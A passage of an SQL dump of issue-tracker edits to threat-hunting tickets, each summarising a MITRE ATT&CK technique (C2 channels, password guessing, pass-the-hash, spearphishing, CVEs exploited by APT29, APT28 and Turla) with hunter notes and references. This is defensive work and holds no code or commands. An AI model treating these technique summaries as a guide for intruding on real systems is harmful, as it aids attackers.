desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\r\n\r\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\r\n\r\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1219\r\nhttps://BLOG-ASSETS.f-secure.com/wp-content/uploads/2019/10/15163418/CozyDuke.pdf\r\n\r\nNotes:\r\nevent.code : 1 OR 4688 -- \r\nevent.code : 3 OR 5167'),(144,146,'attr','description','\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\n','Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1008\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\n'),(145,147,'attr','description','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"',' Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp. '),(146,148,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/','Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1071/004\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/'),(147,149,'attr','description','\r\n\r\nReferences: \r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/','Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\r\n\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1071/001\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/'),(148,150,'attr','description','\r\n\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"','An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts. \r\n\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"'),(149,151,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1132/001\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(150,152,'attr','description','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(151,153,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/2019/10/17/operation-ghost-dukes-never-left/','Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1008\r\nhttps://www.welivesecurity.com/2019/10/17/operation-ghost-dukes-never-left/'),(152,154,'attr','description','\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n','Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems. Some data encoding systems may also result in data compression, such as gzip. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n'),(158,159,'attr','description','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\nReferences:\r\nhttps://attack.mitre[.]org/techniques/T1190/','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n'),(162,163,'attr','description','Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\r\n\r\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1106+-+Native+API%27s\r\n</pre>\r\n\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1016+-+System+Network+Configuration+Discovery?src=contextnavpagetreemode\r\n</pre>\r\n\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1016/\r\n</pre>\r\n','Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\r\n\r\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1106+-+Native+API%27\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1016+-+System+Network+Configuration+Discovery?src=contextnavpagetreemode\r\nhttps://attack.mitre.org/techniques/T1016/\r\n</pre>\r\n'),(163,164,'attr','description','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n'),(164,165,'attr','description','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n\r\nRefrences:\r\n<pre>\r\n/confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\n</pre>','Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems.\r\n\r\nSpecific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.\r\n\r\nRefrences:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1018+-+Remote+System+Discovery\r\n</pre>'),(166,168,'attr','description','Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target\'s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\r\n\r\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\'s login failure policies.\r\n\r\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\r\n\r\nSSH (22/TCP)\r\nTelnet (23/TCP)\r\nFTP (21/TCP)\r\nNetBIOS / SMB / Samba (139/TCP & 445/TCP)\r\nLDAP (389/TCP)\r\nKerberos (88/TCP)\r\nRDP / Terminal Services (3389/TCP)\r\nHTTP/HTTP Management Services (80/TCP & 443/TCP)\r\nMSSQL (1433/TCP)\r\nOracle (1521/TCP)\r\nMySQL (3306/TCP)\r\nVNC (5900/TCP)\r\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\r\n\r\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.','Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target\'s policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\r\n\r\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\'s login failure policies.\r\n\r\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\r\n\r\nSSH (22/TCP)\r\nTelnet (23/TCP)\r\nFTP (21/TCP)\r\nNetBIOS / SMB / Samba (139/TCP & 445/TCP)\r\nLDAP (389/TCP)\r\nKerberos (88/TCP)\r\nRDP / Terminal Services (3389/TCP)\r\nHTTP/HTTP Management Services (80/TCP & 443/TCP)\r\nMSSQL (1433/TCP)\r\nOracle (1521/TCP)\r\nMySQL (3306/TCP)\r\nVNC (5900/TCP)\r\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\r\n\r\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\r\n\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1110/001/\r\n</pre>'),(167,169,'attr','subject','Phishing: Spearphishing attachment -T1566','Phishing: Spearphishing attachment - T1566'),(168,170,'attr','subject','Phishing: Spearphishing attachment - T1566','Phishing: Spearphishing attachment - T1566.001'),(169,171,'attr','subject','Phishing: Spearphishing link - T1566','Phishing: Spearphishing link - T1566.002'),(171,173,'attr','subject','Use Alternate Auth Material: Pass the Hash - T1550.002','Use Alternate Authentication Material: Pass the Hash - T1550.002'),(172,174,'attr','description','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\n</pre>','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>'),(173,175,'attr','subject','Remote Services: SMB/Windows Admin Shares - T1021','Remote Services: SMB/Windows Admin Shares - T1021.002'),(174,176,'attr','description','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\n\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\nTurla has used spearphishing emails to deliver BrainTest as a malicious attachment.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>'),(175,177,'attr','subject','Use Alternate Authentication Material - T1550','Use Alternate Authentication Material - T1550.003'),(176,178,'attr','subject','Use Alternate Authentication Material - T1550.003','Use Alternate Authentication Material: Pass the ticket - T1550.003'),(177,179,'attr','description','APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.\r\n\r\n<pre>\r\nHunter Notes: \r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1566/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.002+Spearphishing+Link\r\n</pre>','APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.\r\n\r\nAPT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.\r\n\r\nTurla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.\r\n\r\n<pre>\r\nHunter Notes: \r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1566/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.002+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.002+-+Spearphishing+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1204.001+-+Malicious+Link\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+T1566.002+-+Spearphishing+Link | https://confluence.di2e.net/display/CYH836/Turla%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\n</pre>'),(178,180,'attr','description','Turla has infected victims using watering holes.\r\n\r\n<pre>\r\nHunter Notes: \r\nTurla has infected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise | https://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>','Turla has infected victims using watering holes.\r\n\r\n<pre>\r\nHunter Notes: \r\nTurla has infected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>'),(179,181,'attr','description','Abusing trusted domains to gain access.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1199/\r\nhttps://confluence.di2e.net/display/CYH836/T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\n</pre>','Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\r\n\r\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider\'s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1199/\r\nhttps://confluence.di2e.net/display/CYH836/T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\n</pre>'),(180,182,'attr','subject','T1550 – Use alternate Auth Material: Pass the hash','Use alternate Auth Material: Pass the hash - T1550.002'),(181,183,'attr','priority_id','2','3'),(182,184,'attr','subject','Use alternate Auth Material: Pass the hash - T1550.002','Use alternate Auth Material: Pass the hash - T1550.003'),(183,184,'attr','description','APT28 has used pass the hash for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>','APT28 has used pass the hash for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>'),(184,185,'attr','subject','Use alternate Auth Material: Pass the hash - T1550.003','Use alternate Auth Material: Pass the hash - T1550.002'),(185,185,'attr','description','APT28 has used pass the hash for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>','APT28 has used pass the hash for lateral movement.\r\n\r\n<pre>\r\nHunter Notes:\r\nHard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>'),(186,186,'attr','subject','Use alternate Auth Material: Pass the ticket - T1550','Use alternate Auth Material: Pass the ticket - T1550.003'),(188,188,'attr','description','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\nAPT28 has conducted SQL injection attacks against organizations\' external websites.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n'),(193,193,'attr','subject','Windows Management Instrumentation - T1047','Windows Management Instrumentation - T1047 (N)'),(194,194,'attr','description','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\nAPT28 has conducted SQL injection attacks against organizations\' external websites.\r\n\r\n<pre>\r\nHunter Notes:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n','APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.\r\n\r\nAPT28 has conducted SQL injection attacks against organizations\' external websites.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nSuricata can alert on this if CVE | Otherwise may be harder to detect\r\n\r\nHost:\r\nPriority may change depending on the public facing applications\r\nCheck with MP to see if vulnerable to CVEs\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1190/\r\n</pre>\r\n'),(199,198,'relation','copied_to',NULL,'104'),(204,203,'attr','description','Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.\r\n\r\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1047/\r\n</pre>','Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.\r\n\r\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.\r\nh3. References\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1047/\r\nhttps://confluence.di2e.net/display/CYH836/T1047+-+Windows+Management+Instrumentation\r\n</pre>'),(206,205,'relation','copied_to',NULL,'106'),(208,207,'attr','description','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\n\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\nTurla has used spearphishing emails to deliver BrainTest as a malicious attachment.\r\n\r\n<pre>\r\nHunter Notes:\r\nReally hard to hunt\r\n</pre>\r\n\r\n<pre>\r\nReferences: \r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>','APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.\r\n\r\nAPT28 sent spearphishing emails containing malicious Microsoft Office attachments.\r\n\r\nTurla has used spearphishing emails to deliver BrainTest as a malicious attachment.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nReally hard to hunt\r\n\r\nHost:\r\n\r\n</pre>\r\n\r\n+*References:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1566/001/\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1566.001+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1566.001+-+Spearphishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1566.001+-+Spearfishing+Attachment\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1566.001+-+Spearphishing+Attachment?src=contextnavpagetreemode\r\n</pre>'),(209,208,'relation','copied_to',NULL,'107'),(211,210,'relation','copied_to',NULL,'108'),(215,214,'attr','description','Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\r\n\r\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider\'s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1199/\r\nhttps://confluence.di2e.net/display/CYH836/T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\n</pre>','Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining 